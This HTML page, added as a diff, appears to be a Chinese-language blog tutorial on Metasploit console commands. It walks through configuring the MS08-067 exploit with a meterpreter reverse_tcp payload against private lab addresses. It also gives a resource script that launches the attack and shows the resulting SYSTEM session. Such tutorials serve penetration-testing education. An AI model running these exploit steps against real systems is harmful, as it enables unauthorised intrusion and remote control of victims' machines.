@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<!--Copyright©QingSword.COM︻☼1010D>-->
+<!--Copyright©X.QingSword.COM︻☼1010D>-->
+<html lang="zh-cn">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
+	<meta name="keywords" content="晴刃,晴,qing,qingsword,ccna图文笔记,ubuntu,linux,ubuntu server,mysql,python,计算机技术博客,渗透测试,kali渗透测试,kali,kali web渗透,kali主机渗透,kali无线渗透,metasploit,白帽子测试">
+	<meta name="keywords" content="晴刃,晴,qing,qingsword,ccna图文笔记,ubuntu,linux,ubuntu server,mysql,node.js,javascript,python,计算机技术博客">
+	<meta name="author" content="x.qingsword.com">
+	<title>[Metasploit]-4-msf常用命令详解 - X.QingSword.COM</title>
+	<link rel="shortcut icon" type="image/x-icon" href="../logo/favicon.ico">
+	<link rel="stylesheet" type="text/css" href="../css/basic.css">
+	<link rel="stylesheet" type="text/css" href="../css/text.css">
+	<!-- 代码块高亮js -->
+	<link type="text/css" rel="stylesheet" href="../plugins/SyntaxHighlighter/styles/shCore.css"/>
+	<link type="text/css" rel="stylesheet" href="../plugins/SyntaxHighlighter/styles/shThemeRDark.css"/>
+	<script type="text/javascript" src="../plugins/SyntaxHighlighter/scripts/shCore.js"></script>
+	<script type="text/javascript" src="../plugins/SyntaxHighlighter/scripts/shBrushBash.js"></script>
+	<script type="text/javascript">
+	SyntaxHighlighter.all();
+	</script>
+</head>
+<body>
+	<!--header -->
+	<header id="nav">
+			<div class="nav-container"> 
+				<!-- 根大纲-->
+				<a href="http://x.qingsword.com" title="晴刃">
+					<h1 class="nav-logo">晴刃</h1>
+				</a>
+				<h2 class="nav-site-description desc-hidden">
+					He lies somewhere here
+				</h2>
+				<nav class="nav-links"> 
+					<!-- nav连接大纲-->
+					<h1 style="display:none;">网站导航</h1> 
+					<ul>
+						<li  class="active li-hidden">
+							<a href="../index.html" title="home">
+								<span class="link-word"><img src="../logo/home.png" alt="home" class="link-img">首页</span>
+							</a>
+						</li>
+						<li class="li-hidden">
+							<a href="../pt.html" title="pt">
+								<span class="link-word"><img src="../logo/linux.png" alt="pt" class="link-img">渗透<span class="word-hidden">技术</span></span>
+							</a>
+						</li>
+						<li >
+							<a href="../sitemap.html" title="sitemap">
+								<span class="link-word"><img src="../logo/archives.png" alt="archives" class="link-img"><span class="word-hidden">文章</span>归档</span>
+							</a>
+						</li>
+					</ul>
+				</nav>
+			</div>		
+	</header>
+	<!-- /header -->
+
+	<!-- content-->
+	<div id="content">
+		<div class="content-container">
+			<!-- 文章区 -->
+			<article class="text-container">
+				<header class="text-header">
+					<h1>[Metasploit]-4-msf常用命令详解</h1>	
+				</header><!-- /header -->
+				<section class="text-body">
+					<h2>引言</h2>
+					<p>在上一篇文章中，我们通过一个经典漏洞实例来演示了msf攻击流程，这篇文章将对msf下常用命令做进一步补充说明。</p>
+					<!-- 目录 -->
+					<h2>文章目录</h2>
+					<ul class="contents">	
+						 <li><a href="#msf-command-1">0×1.如何使用search命令搜索模块信息</a></li>
+						 <li><a href="#msf-command-2">0×2.如何使用show命令显示模块信息</a></li>
+						 <li><a href="#msf-command-3">0×3.如何使用use命令来加载模块</a></li>
+						 <li><a href="#msf-command-4">0×4.如何使用info命令来查看模块详情</a></li>
+						 <li><a href="#msf-command-5">0×5.模块内部show命令用法</a></li>
+						 <li><a href="#msf-command-6">0×6.如何使用set命令来配置模块参数</a></li>
+						 <li><a href="#msf-command-7">0×7.数据库连接的几种方式</a></li>
+						 <li><a href="#msf-command-8">0×8.如何查看数据库中保存的主机信息</a></li>
+						 <li><a href="#msf-command-9">0×9.如何从外部导入xml数据</a></li>
+						 <li><a href="#msf-command-10">0×10.如何使用setg配置全局变量</a></li>
+						 <li><a href="#msf-command-11">0×11.如何使用resource命令调用资源文件</a></li>
+					 </ul>
+					<!-- /目录 -->
+
+					<!-- 正文 -->
+					
+					<h2 id="msf-command-1">0×1.如何使用search命令搜索模块信息</h2>
+
+					<p>Search命令可以帮助我们查找模块中利用文件路径，如果新出了一个MS漏洞，如果不使用搜索命令，我们需要到"/usr/share/metasploit-framework/modules/"对应的模块目录中去查找新发布的漏洞利用代码，那样效率非常低下，我们可以使用search命令直接在msf控制台中，配合不同的搜索参数来完成特定利用代码文件位置的查找，请看下面的实例：</p>
+					<pre class="brush: bash;">
+					#首先进入msf控制台
+					#使用search命令搜索ms08-067利用文件路径
+					msf &gt; search ms08-067
+
+					Matching Modules
+					================
+					#模块Name下面就是这个利用文件完整路径
+					   Name 
+					   ----
+					   exploit/windows/smb/ms08_067_netapi
+
+					 #如果在搜索过程中出现"slow search"提示，说明我们还未构建搜索缓存，可以使用"db_rebuild_cache"命令来重构缓存（命令会在后台运行，需要几分钟时间完成，等它自动执行完成后，就不会出现这个提示了，并且搜索速度也会变得非常快）
+					Module database cache not built yet, using slow search
+					msf &gt; db_rebuild_cache 
+
+					#再来看一个实例，搜索所有属于windows平台（platform:windows），并且包含ftp关键字（name:ftp）信息的内容，这样会将Metasploit收录的windows下不同ftp版本的漏洞利用文件全部搜索出来
+					msf &gt; search platform:windows name:ftp
+
+					#笔者从输出的结果中截取了六条信息如下，并用"|"号分隔了每个字段；
+
+					#其中第一段表示这个漏洞利用代码的位置，这个位置是一个相对Metasploit主文件夹的位置，Metasploit安装好后，主文件夹默认位置为"/usr/share/metasploit-framework/"，拿第一条的第一个字段"exploit/windows/tftp/tftpd32_long_filename"举例，它的完整路径就是"/usr/share/metasploit-framework/xploit/windows/tftp/tftpd32_long_filename.rb"，在这里有个细节需要注意，我在最后添加了一个".rb"，这是因为，Metasploit在显示漏洞利用脚本的位置时，不会携带文件名后缀，而这个文件本身是一个ruby脚本，并且是有".rb"后缀的；
+
+					#第二段"2002-11-19"表示这个脚本创建的时间；
+
+					#第三段"average"表示这个脚本性能的好坏，"low"代表这个模块代码质量很差，"manual"表示需要手动执行，"good"表示代码质量优于"normal"，最好的代码标记是"excellent"，代码性能标记由差到好分别是："low" &gt; "average" &gt; "normal" &gt; "good" &gt; "great" &gt; "excellent"；
+
+					#第四段是这个漏洞利用脚本的简单介绍；
+
+					exploit/windows/tftp/tftpd32_long_filename|2002-11-19|average|TFTPD32 Long Filename Buffer Overflow
+					exploit/windows/tftp/tftpdwin_long_filename|2006-09-21|great|TFTPDWIN v0.4.2 Long Filename Buffer Overflow
+					exploit/windows/tftp/tftpserver_wrq_bof|2008-03-26|normal|TFTP Server for Windows 1.4 ST WRQ Buffer Overflow
+					exploit/windows/ftp/winaxe_server_ready|2016-11-03|good|WinaXe 7.7 FTP Client Remote Buffer Overflow
+					exploit/windows/ftp/open_ftpd_wbem|2012-06-18|excellent|Open-FTPD 1.2 Arbitrary File Upload
+					exploit/windows/ftp/sami_ftpd_list|2013-02-27|low|Sami FTP Server LIST Command Buffer Overflow
+					</pre>
+
+					<h2 id="msf-command-2">0×2.如何使用show命令显示模块信息</h2>
+					
+					<p>除了Search外，在msf控制台中，还能够使用show命令来完整的显示某个模块下所有漏洞利用代码的信息，请看下面的实例：</p>
+					<pre class="brush: bash;">
+					#显示exploits模块下所有可以使用的漏洞利用脚本信息
+					msf &gt; show exploits
+
+					#显示所有可用的payload
+					msf &gt; show payloads 
+
+					#显示六大模块下所有脚本信息（显示十分耗费系统资源，请慎用）
+					msf > show all
+					</pre>
+					<p>使用show模块显示所有代码信息的方式并不常用，也十分耗费系统资源。</p>
+
+					<h2 id="msf-command-3">0×3.如何使用use命令来加载模块</h2>
+
+					<p>在使用search搜索到利用代码位置后，如果需要使用这个攻击脚本（将Metasploit中的"攻击脚本"叫做"攻击载荷"或者直接叫"Exploit"，它们都是相同的意思），可以使用use命令来加载它，use命令告诉msf控制台："我现在需要使用这个Exploit"；然后我们会发现msf控制台前缀会变成这个Exploit的路径，请看下面的实例：</p>
+					<pre class="brush: bash;">
+					#use也好，search也好，只是msf控制台本身自带的命令，就像windows cmd下的ipconfig那样
+
+					#首先搜索ms08-067文件路径
+					msf &gt; search ms08-067
+					exploit/windows/smb/ms08_067_netapi 
+
+					#对于这个路径，我们来看一下这个文件的真实位置
+					#首先我们知道"/usr/share/metasploit-framework"是msf程序住路径，控制台程序"msfconsole"就存放在这个目录下
+					root@qingsword:~#cd /usr/share/metasploit-framework/modules/exploits/windows/smb
+
+					#其次，再来看我们搜索到的路径文件"exploit/windows/smb/ms08_067_netapi"，对应真实路径，不难发现，msf控制台程序会自动搜索其所在目录下的"modules"目录，如果我们搜索的是exploit，那么就在exploits目录中查找，如果搜索的是payload，就在payloads目录中查找，使用ls加上筛选命令，就能查看到这个exploit利用文件的全名，是一个ruby脚本文件
+					root@qingsword:/usr/share/metasploit-framework/modules/exploits/windows/smb# ls | grep ms08_067
+					ms08_067_netapi.rb
+					
+					#加载这个脚本文件的方法，只需要使用语法"use [search搜索到的文件Name]"
+					msf &gt; use exploit/windows/smb/ms08_067_netapi 
+					msf exploit(windows/smb/ms08_067_netapi) > 
+					</pre>
+
+					<h2 id="msf-command-4">0×4.如何使用info命令来查看模块详情</h2>
+
+					<p>加载了某个Exploit后，可以使用info命令来查看这个Exploit的详细信息：</p>
+					<pre class="brush: bash;">
+					#显示Exploit详情
+					msf exploit(windows/smb/ms08_067_netapi) &gt; info
+
+					#Exploit模块名称
+					Name: MS08-067 Microsoft Server Service Relative Path Stack Corruption
+					Module: exploit/windows/smb/ms08_067_netapi
+					#所属平台windows
+					Platform: Windows
+					Arch: 
+					Privileged: Yes
+					License: Metasploit Framework License (BSD)
+					#模块质量
+					Rank: Great
+					#被收录到msf的时间
+					Disclosed: 2008-10-28
+
+					#模块贡献者
+					Provided by:
+					  hdm x@hdm.io
+					  Brett Moore brett.moore@insomniasec.com
+					  frank2 frank2@dc949.org
+					  jduck jduck@metasploit.com
+
+					#模块能够攻击的系统版本
+					Available targets:
+					  Id  Name
+					  --  ----
+					  0   Automatic Targeting
+					  1   Windows 2000 Universal
+					  2   Windows XP SP0/SP1 Universal
+
+					#模块需要设置的参数信息（Required为yes的都是必填项，部分已自动填写无需修改）
+					  Basic options:
+					  Name     Current Setting  Required  Description
+					  ----     ---------------  --------  -----------
+					  RHOST                     yes       The target address
+					  RPORT    445              yes       The SMB service port (TCP)
+					  SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+					#这个Exploit攻击成功后，能够写入目标内存的Payload的大小为408字节
+					Payload information:
+					  Space: 408
+					  Avoid: 8 characters
+
+					#这个Exploit的描述信息，这个描述信息虽然简短，但句句精髓，首先说明了这个漏洞是因为windows中的"NetAPI32.dll"文件存在设计缺陷，然后是这个Exploit能够攻击成功的系统版本XP能够成功被调用，对2003的利用有可能会导致系统崩溃。
+					Description:
+					  This module exploits a parsing flaw in the path canonicalization 
+					  code of NetAPI32.dll through the Server Service. This module is 
+					  capable of bypassing NX on some operating systems and service packs. 
+					  The correct target must be used to prevent the Server Service (along 
+					  with a dozen others in the same process) from crashing. Windows XP 
+					  targets seem to handle multiple successful exploitation events, but 
+					  2003 targets will often crash or hang on subsequent attempts. This 
+					  is just the first version of this module, full support for NX bypass 
+					  on 2003, along with other platforms, is still in development.
+
+					#这个漏洞相关文档位置，包含微软官方的文档都在其中
+					References:
+					  https：//cvedetails.com/cve/CVE-2008-4250/
+					  OSVDB (49243)
+					  https：//technet.microsoft.com/en-us/library/security/MS08-067
+					  http：//www.rapid7.com/vulndb/lookup/dcerpc-ms-netapi-netpathcanonicalize-dos
+					</pre>
+
+					<h2 id="msf-command-5">0×5.模块内部show命令用法</h2>
+
+					<p>在Exploit下使用show命令，能够查看这个Exploit所能够配置的参数与Payload信息等，请看下面的实例：</p>
+					<pre class="brush: bash;">
+					#显示需要配置的参数信息
+					msf exploit(windows/smb/ms08_067_netapi) &gt; show options 
+
+					Module options (exploit/windows/smb/ms08_067_netapi):
+
+					   Name     Current Setting  Required  Description
+					   ----     ---------------  --------  -----------
+					   RHOST                     yes       The target address
+					   RPORT    445              yes       The SMB service port (TCP)
+					   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+					#显示这个Exploit能够攻击的目标系统版本（有时候，我们查找的模块没有提供可攻击的系统版本，就只能通过info信息中的描述部分中的内容来判断这个Exploit能够在什么环境下使用了）
+					msf exploit(windows/smb/ms08_067_netapi) &gt; show targets 
+
+					#显示这个Exploit能够加载的Payload
+					msf exploit(windows/smb/ms08_067_netapi) &gt; show payloads 
+
+					#只有部分的Exploit，需要配置高级参数，可以使用"show advanced"命令来查看，一般Exploit advance配置里保持默认即可
+					msf exploit(windows/smb/ms08_067_netapi) &gt; show advanced 
+
+					#显示这个模块中有哪些我们还没有配置的必填项，从输出看，RHOST（攻击目标主机IP）参数我们还没有配置，使用set命令设置好后就不会出现在missing列表中了
+					msf exploit(windows/smb/ms08_067_netapi) &gt;  show missing 
+
+					Module options (exploit/windows/smb/ms08_067_netapi):
+
+					   Name   Current Setting  Required  Description
+					   ----   ---------------  --------  -----------
+					   RHOST                   yes       The target address
+
+					#显示这个攻击模块中用作混淆的模块信息（这些混淆模块一般用于逃避杀毒软件的查杀提高利用成功率等）
+					msf exploit(windows/smb/ms08_067_netapi) &gt; show evasion 
+
+					#如果我们向修改这个Exploit文件源码信息，可以直接输入edit命令（将会使用vim打开）
+					msf exploit(windows/smb/ms08_067_netapi) &gt; edit
+					</pre>
+
+					<h2 id="msf-command-6">0×6.如何使用set命令来配置模块参数</h2>
+
+					<p>在上面的例子中，我们加载了Exploit模块后，用show missing命令查看必须配置的参数信息（或直接show options），然后通过set命令来配置它们，如下所示：</p>
+					<pre class="brush: bash;">
+					msf exploit(windows/smb/ms08_067_netapi) &gt;  show missing 
+
+					Module options (exploit/windows/smb/ms08_067_netapi):
+
+					   Name   Current Setting  Required  Description
+					   ----   ---------------  --------  -----------
+					   RHOST                   yes       The target address
+
+					#设置rhost为目标主机IP地址（在msf中参数不分大小写，可以RHOST也可以rhost）
+					msf exploit(windows/smb/ms08_067_netapi) &gt;  set rhost 192.168.80.141
+					rhost => 192.168.80.141
+
+					#查看配置，发现rhost后面已经被配置成了刚才我们设置的ip地址
+					msf exploit(windows/smb/ms08_067_netapi) &gt;  show options 
+
+					Module options (exploit/windows/smb/ms08_067_netapi):
+
+					   Name     Current Setting  Required  Description
+					   ----     ---------------  --------  -----------
+					   RHOST    192.168.80.141   yes       The target address
+					   RPORT    445              yes       The SMB service port (TCP)
+					   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+					#设置Payload
+
+					#这里payload的路径与Exploit的路径匹配方式稍有不同，在msf主目录中payloads目录下有三个文件夹，对这三个文件夹的说明如下
+
+					#singles payload，可以在目标机器上加载一个完整的命令执行进程，但部分漏洞可修改的内存空间非常小，无法加载其中的代码文件，这个时候需要使用stagers payload首先在目标计算机上开放一个端口连接到本地计算机上，这个stagers payload仅维持这个连接，所以需要写入内存的数值非常的小，连接建立后，再使用stages payload，从攻击者计算机中发送一个完整的payload到目标的计算机中执行，从而获得目标的完整控制权。
+
+					root@qingsword:/usr/share/metasploit-framework/modules/payloads# ls
+					singles  stagers  stages
+
+					#那么我如何判断使用set payload后面这一串路径（windows/meterpreter/reverse_tcp）到底使用的是哪个payload文件？
+
+					#实际上msf控制台会智能的解析路径信息，然后根据Exploit能够获得的内存大小，智能的去选择上面三个文件夹中的payload
+
+					#本例中，msf分解（windows/meterpreter/reverse_tcp）路径得到三个值，windows，meterpreter，reverse_tcp，大概的意思就是使用windows下面的meterpreter提供的shellcode（meterpreter是一个功能强大的命令行控制器），这个shellcode的功能是反向连接reverse_tcp
+					#然后它根据Exploit能够获得的目标内存大小，判断这个大小是否能够容纳一个完整的meterpreter reverse_tcp payload，如果能够获取的目标内存够大，那么就会直接加载singles目录下windows目录中的"meterpreter_reverse_tcp.rb"，作为这次攻击的payload发送给目标主机
+
+					#如果内存容纳不了一个完整的meterpreter_reverse_tcp payload，那么它首先会选择stagers下windows目录中的reverse_tcp.rb发送给目标先与目标建立一个tcp连接（为什么选这个文件发送给目标主机？因为我们提供的路径中包含reverse_tcp这个值），再通过这个tcp连接，将stages目录下windows目录中的meterpreter.rb发送给主机，与目标主机建立一个meterpreter shellcode完整连接
+
+					msf exploit(windows/smb/ms08_067_netapi) &gt; set payload windows/meterpreter/reverse_tcp
+					payload => windows/meterpreter/reverse_tcp
+
+					#payload设置好后，options下面就会多出payload的配置信息
+					msf exploit(windows/smb/ms08_067_netapi) &gt; show options 
+
+					Module options (exploit/windows/smb/ms08_067_netapi):
+
+					   Name     Current Setting  Required  Description
+					   ----     ---------------  --------  -----------
+					   RHOST    192.168.80.141   yes       The target address
+					   RPORT    445              yes       The SMB service port (TCP)
+					   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+					Payload options (windows/meterpreter/reverse_tcp):
+
+					   Name      Current Setting  Required  Description
+					   ----      ---------------  --------  -----------
+					   EXITFUNC  thread           yes       Exit technique 
+					   LHOST                      yes       The listen address 
+					   LPORT     4444             yes       The listen port
+
+					#在payload中，需要填写攻击者的IP地址（因为使用的是reverse_tcp这个payload，这个payload在上传成功后，会从目标主机上主动连接到攻击者设定的这个lhost地址的lport端口）
+					msf exploit(windows/smb/ms08_067_netapi) &gt; show missing 
+
+					Payload options (windows/meterpreter/reverse_tcp):
+
+					   Name   Current Setting  Required  Description
+					   ----   ---------------  --------  -----------
+					   LHOST                   yes       The listen address
+
+					#设置lhost参数，并且将本地监听端口改成9876
+					msf exploit(windows/smb/ms08_067_netapi) &gt; set lhost 192.168.80.153
+					lhost => 192.168.80.153
+					msf exploit(windows/smb/ms08_067_netapi) &gt; set lport 9876
+					lport => 9876
+					
+					#设置目标主机系统版本
+					msf exploit(windows/smb/ms08_067_netapi) &gt; set target 34
+					target => 34
+
+					#查看配置
+					msf exploit(windows/smb/ms08_067_netapi) &gt; show options 
+
+					Module options (exploit/windows/smb/ms08_067_netapi):
+
+					   Name     Current Setting  Required  Description
+					   ----     ---------------  --------  -----------
+					   RHOST    192.168.80.141   yes       The target address
+					   RPORT    445              yes       The SMB service port (TCP)
+					   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+					Payload options (windows/meterpreter/reverse_tcp):
+
+					   Name      Current Setting  Required  Description
+					   ----      ---------------  --------  -----------
+					   EXITFUNC  thread           yes       Exit technique
+					   LHOST     192.168.80.153   yes       The listen address
+					   LPORT     9876             yes       The listen port
+
+
+					Exploit target:
+
+					   Id  Name
+					   --  ----
+					   34  Windows XP SP3 Chinese - Simplified (NX)
+
+					#如果我们现在想要清空一个我们之前配置的参数，可以使用unset命令，例如，清除我们设置的lhost参数
+					msf exploit(windows/smb/ms08_067_netapi) &gt; unset lhost
+					</pre>
+
+					<h2 id="msf-command-7">0×7.数据库连接的几种方式</h2>
+
+					<p>在第二篇的介绍中，我们直到Metasploit使用的是Postgresql，下面就来看看在msf控制台下，几种常用的数据库命令的用法：</p>
+					<pre class="brush: bash;">
+					#连接到本地数据库，支持yml后缀的数据库格式（postgresql），语法：
+					#db_connect -y 数据库文件完整路径 
+
+					#连接到数据库服务器中的数据库，语法：
+					#db_connect 用户名:密码@IP:Port/数据库名称 
+
+					#笔者并没有测试远程数据库连接的用法，下面用本地数据库演示
+
+					#查看本地数据库状态，显示已经连接到msf数据库
+					msf &gt; db_status 
+					[*] postgresql connected to msf
+
+					#断开数据库连接，再次查询数据库状态，显示没有连接
+					msf &gt; db_disconnect 
+					msf &gt; db_status 
+					[*] postgresql selected, no connection
+
+					#使用db_connect -y连接到本地数据库文件（默认情况下msf本地数据库文件存放路径是/usr/share/metasploit-framework/config/，数据库文件名是database.yml）
+					msf &gt; db_connect -y /usr/share/metasploit-framework/config/database.yml
+					[*] Rebuilding the module cache in the background...
+
+					msf &gt; db_status 
+					[*] postgresql connected to msf
+					</pre>
+
+					<h2 id="msf-command-8">0×8.如何查看数据库中保存的主机信息</h2>
+
+					<p>我们使用msf去扫描攻击一些目标主机时，目标主机的信息会全部记录在本地的主机列表中，可以使用下面的方式查看这些信息：</p>
+					<pre class="brush: bash;">
+					#查看本地数据库中保存的主机列表
+					msf &gt; hosts 
+
+					Hosts
+					=====
+
+					address         mac                name             os_name       os_flavor  os_sp 
+					-------         ---                ----             -------       ---------  ----- 
+					192.168.80.1    00:50:56:C0:00:08  qingsword                                                       
+					192.168.80.2    00:50:56:F6:9B:48                                                                  
+					192.168.80.4                       111-2C40AD98180  Windows XP               SP3
+					192.168.80.137  00:0c:29:5a:a5:17                   Unknown
+					192.168.80.139
+					192.168.80.140
+					192.168.80.141  00:0c:29:27:e0:14                   Unknown
+					192.168.80.148  00:0c:29:ce:74:d6                   Unknown
+					192.168.80.153                                      Unknown                         
+					192.168.80.154                     SWORD-C523BCF82  Windows 2003             SP2
+					192.168.80.254  00:50:56:F9:A9:D8
+
+					#使用-c参数进行列筛选显示
+
+					#仅显示address与mac列
+					msf &gt; hosts -c address,mac
+
+					Hosts
+					=====
+
+					address         mac
+					-------         ---
+					192.168.80.1    00:50:56:C0:00:08
+					192.168.80.2    00:50:56:F6:9B:48
+					192.168.80.4    
+					192.168.80.137  00:0c:29:5a:a5:17
+					192.168.80.139  
+					192.168.80.140  
+					192.168.80.141  00:0c:29:27:e0:14
+					192.168.80.148  00:0c:29:ce:74:d6
+					192.168.80.153  
+					192.168.80.154  
+					192.168.80.254  00:50:56:F9:A9:D8
+
+					#仅显示address与name列
+					msf &gt; hosts -c address,name
+
+					Hosts
+					=====
+
+					address         name
+					-------         ----
+					192.168.80.1    qingsword
+					192.168.80.2    
+					192.168.80.4    111-2C40AD98180
+					192.168.80.137  
+					192.168.80.139  
+					192.168.80.140  
+					192.168.80.141  
+					192.168.80.148  
+					192.168.80.153  
+					192.168.80.154  SWORD-C523BCF82
+					192.168.80.254 
+
+					#显示目标主机开放的服务端口信息（如果不加IP地址，就是查看msf数据库中收录的所有主机的服务端口信息）
+					msf &gt; services 192.168.80.153
+					Services
+					========
+
+					host            port  proto  name  state  info
+					----            ----  -----  ----  -----  ----
+					192.168.80.153  22    tcp    ssh   open   
+
+					#使用-c参数，仅显示主机的port列信息
+					msf &gt; services 192.168.80.153 -c port
+					Services
+					========
+
+					host            port
+					----            ----
+					192.168.80.153  22
+
+					#显示主机port与state列信息
+					msf > services 192.168.80.153 -c port,state
+					Services
+					========
+
+					host            port  state
+					----            ----  -----
+					192.168.80.153  22    open
+
+					#使用-S（大写）参数，查找包含3389关键字的主机信息
+					msf &gt; services -S 3389
+					Services
+					========
+
+					host            port  proto  name           state  info
+					----            ----  -----  ----           -----  ----
+					192.168.80.137  3389  tcp    ms-wbt-server  open   
+					192.168.80.148  3389  tcp    ms-wbt-server  open   
+
+					#参数可以组合使用，查找开放了microsoft-ds服务（445）的主机，仅显示port与state列
+					msf > services -c port,state -S microsoft-ds
+					Services
+					========
+
+					host            port  state
+					----            ----  -----
+					192.168.80.137  445   open
+					192.168.80.141  445   open
+					192.168.80.148  445   open
+
+					#仅显示包含端口号22的主机信息
+					msf &gt; services -p 22
+					Services
+					========
+
+					host            port  proto  name  state  info
+					----            ----  -----  ----  -----  ----
+					192.168.80.153  22    tcp    ssh   open  
+					</pre>
+
+					<h2 id="msf-command-9">0×9.何从外部导入xml数据</h2>
+
+					<p>Postgresql数据库不仅支持备份还原，还能支持其他程序生成的xml数据的导入。</p>
+
+					<p class="indent-p">1）数据库的备份与还原</p>
+					<pre class="brush: bash;">
+					#备份msf数据库，保存到root家目录下，名字叫做msfbk.xml，-f后面指定输出的文件类型，本例是xml
+					msf &gt; db_export -f xml /root/msfdb.xml
+					
+					#如果我们在使用的过程中，数据库不小心被破坏，可以使用备份的数据库xml文件来还原数据库
+					#首先我们来做一个破坏性的操作，重新初始化msf数据库，这会删除数据库中所有主机信息
+					#退出msf
+					msf &gt; exit
+					#重新初始化msf数据库
+					root@qingsword:~# msfdb reinit
+					#再次进入msf控制台
+					root@qingsword:~# msfdb run
+
+					#我们之前的所有主机信息已经丢失hosts列表看不到任何主机信息
+					msf &gt; hosts
+					#接下来，恢复数据库信息，使用db_import命令导入备份的数据库
+					msf > db_import /root/msfdb.xml
+					#看到下面这句，说明导入成功
+					[*] Successfully imported /root/msfdb.xml
+
+					#这样所有的主机信息又恢复到备份时的样子了
+					</pre>
+
+					<p class="indent-p">2）从其他软件生成的xml文件中导入数据</p>
+					<pre class="brush: bash;">
+					#使用nmap扫描一台目标主机，并将扫描结果输出成一个xml文件
+					root@qingsword:~# nmap -Pn 192.168.80.131 -oX /root/131.xml
+
+					#将这个xml文件导入msf数据库中
+					msf &gt; db_import /root/131.xml
+					[*] Successfully imported /root/131.xml
+
+					#然后我们就能够在msf主机列表中看到这台主机的信息了，通过这种方法，我们可以将nmap扫描与msf完美的结合起来，用nmap作为前期探测，然后将探测数据全部导入msf数据库中做后期渗透工作
+					</pre>
+
+					<h2 id="msf-command-10">0×10.如何使用setg配置全局变量</h2>
+
+					<p>在上面的实例中，我们可以在Exploit模块中用set命令来配置其中的参数信息，我们注意到有些参数是不怎么变化的，比如攻击者的IP地址lhost，或攻击者的监听端口lport，下面就介绍如何使用setg命令来配置全局参数：</p>
+					<pre class="brush: bash;">
+					#在msf控制台中用setg配置lport全局参数为"9876"，配置全局lhost为"192.168.80.153"
+					msf &gt; setg lport 9876
+					lport =&gt; 9876
+					msf &gt; set lhost 192.168.80.153
+					lhost =&gt; 192.168.80.153
+
+					#设置完成后，我们随意使用一个payload，来查看它的参数，发现这两个参数已经被配置好了
+					msf > use payload/windows/meterpreter/reverse_tcp
+					msf payload(windows/meterpreter/reverse_tcp) > show options 
+
+					Module options (payload/windows/meterpreter/reverse_tcp):
+
+					   Name      Current Setting  Required  Description
+					   ----      ---------------  --------  -----------
+					   EXITFUNC  process          yes       Exit technique 
+					   LHOST     192.168.80.153   yes       The listen address
+					   LPORT     9876             yes       The listen port
+
+					#如果要取消全局参数，可以使用unsetg命令
+					msf payload(windows/meterpreter/reverse_tcp) > unsetg lhost
+					Unsetting lhost...
+					msf payload(windows/meterpreter/reverse_tcp) > unsetg lport
+					Unsetting lport...
+					msf payload(windows/meterpreter/reverse_tcp) > show options 
+
+					Module options (payload/windows/meterpreter/reverse_tcp):
+
+					   Name      Current Setting  Required  Description
+					   ----      ---------------  --------  -----------
+					   EXITFUNC  process          yes       Exit technique 
+					   LHOST                      yes       The listen address 
+					   LPORT     4444             yes       The listen port
+
+					# 4444这个lport端口是msf控制台默认的全局端口，如果我们没有配置lport参数，那么默认就使用这个端口作为本机服务器监听端口，等待目标主机的主动连接
+					</pre>
+
+					<h2 id="msf-command-11">0×11.如何使用resource命令调用资源文件</h2>
+
+					<p>在前面的实例中，如果我需要攻击一台主机，首先需要使用msf加载Exploit，然后在Exploit中加载Payload，然后使用set命令去设置其中的参数信息，实际上有一个更加方便快捷的方法，使用资源文件，自动将我们所有的手动步骤集成到一个资源脚本中，然后通过msf控制台的resource命令来调用它，请看下面的实例：</p>
+					<pre class="brush: bash;">
+					#仍然用ms08_067这个模块来演示，我们假设目标主机IP为"192.168.80.141"，发起攻击的主机IP为"192.168.80.153"
+
+					#首先使用vim命令建立一个资源文件，内容如下（exploit -j，参数-j的意思是，攻击成功后，将得到的session转到后台运行，而不是直接得到一个meterpreter提示符）
+					root@kingsword:~# vim qingsword.rc
+
+					use exploit/windows/smb/ms08_067_netapi
+					set payload windows/meterpreter/reverse_tcp
+					set RHOST 192.168.80.141
+					set LHOST 192.168.80.153
+					set LPORT 9876
+					set target 34
+					exploit -j
+
+					#然后在msf中直接调用这个文件，msf控制台会自动执行qingsword.rc这个脚本中的所有命令
+					msf &gt; resource qingsword.rc
+
+					#也可以直接使用"msfconsole -r 资源文件"来调用这个资源文件
+					root@kingsword:~# msfconsole -r qingsword.rc 
+
+					#资源文件执行完成后，会与目标主机在后台建立一个session
+					msf exploit(windows/smb/ms08_067_netapi) > show sessions
+
+					Active sessions
+					===============
+
+					  1  meterpreter x86/windows  NT AUTHORITY\SYSTEM @ 111-2C40AD98180  192.168.80.158:9876 -> 192.168.80.141:1065 (192.168.80.141)
+
+					#进入这个session
+					msf exploit(windows/smb/ms08_067_netapi) > sessions -i 1
+					[*] Starting interaction with 1...
+
+					#现在可以使用meterpreter控制目标主机了
+					meterpreter > 
+					</pre>
+
+					<!-- /正文 -->
+				
+				<footer class="text-footer">
+					<p>
+						*转载请注明来自:<a title="晴刃-自由、互助、分享、专注计算机技术。" href="http://x.qingsword.com" target="_blank">晴刃(X.QingSword.COM)</a>
+					</p>
+					<p>*原文连接:<a title="[Metasploit]-4-msf常用命令详解" href="https://x.qingsword.com/qing/Metasploit-4.html" target="_blank">https://x.qingsword.com/qing/Metasploit-4.html</a></p>
+				</footer>
+			</article>
+			<!-- /文章区 -->	
+		</div>
+	</div>
+	<!-- /content -->
+	
+	<!-- footer -->
+	<footer id="footer">
+		<div class="footer-container">
+			QingSword.COM &nbsp;<img src="../logo/by-nc-sa.png" alt="Creative Commons" title="Creative Commons">
+		</div>
+	</footer>
+	<!-- /footer -->
+</body>
+</html>
